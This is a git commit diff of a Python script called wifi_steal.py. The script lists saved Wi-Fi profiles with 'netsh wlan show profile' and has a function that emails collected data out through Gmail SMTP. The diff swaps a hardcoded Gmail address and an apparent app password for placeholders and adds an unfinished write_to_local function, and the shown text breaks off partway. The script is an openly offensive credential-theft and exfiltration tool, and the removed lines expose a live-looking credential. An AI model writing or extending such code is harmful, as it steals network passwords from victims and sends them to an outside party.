280caf79185a29958e51e3a0d13a74d176b13c6d
Joseph Merigala <104745031+13HJoe@users.noreply.github.com>
2024-08-01 21:06:05 +0530

    Update wifi_steal.py

--- wifi_steal.py
+++ wifi_steal.py
@@ -5,14 +5,17 @@ import re
 def send_mail(message):
     smtp_obj = smtplib.SMTP('smtp.gmail.com',587)
     smtp_obj.starttls()
-    smtp_obj.login("joseph.merigala@gmail.com","nwgnxkvqsyvaehij")
-    smtp_obj.sendmail("joseph.merigala@gmail.com","joseph.merigala@gmail.com", message)
+    smtp_obj.login("src@gmail.com","<app pass>")
+    smtp_obj.sendmail("src@gmail.com","target@gmail.com", message)
     smtp_obj.quit()
 
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
 networks = networks.decode('utf-8')
 networks = re.findall("(?:Profile\s*:\s)(.*)", networks)
+
+def write_to_local(message):
+    stat
 
 res = ""
 for net in networks:
